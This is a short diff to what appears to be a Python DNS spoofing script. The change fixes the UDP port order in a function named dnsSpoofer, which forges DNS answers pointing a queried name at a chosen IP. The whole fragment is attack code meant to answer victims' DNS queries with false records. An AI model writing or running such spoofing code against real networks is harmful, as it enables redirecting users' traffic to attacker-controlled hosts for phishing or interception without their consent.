@@ -19,7 +19,7 @@ def dnsSpoofer(packet):
 		forwardIP = findIP(queryName)
 
 		ip = IP(dst=srcIP,src=dstIP)
-        	udp = UDP(dport=destPort,sport=sourcePort)
+        	udp = UDP(dport=sourcePort,sport=destPort)
 		dns = DNS(id=dns_id,qr=1,qd=dns_qd,an=DNSRR(rrname=queryName,ttl=60,rdata=forwardIP))
 
 		dnsPacket = ip/udp/dns
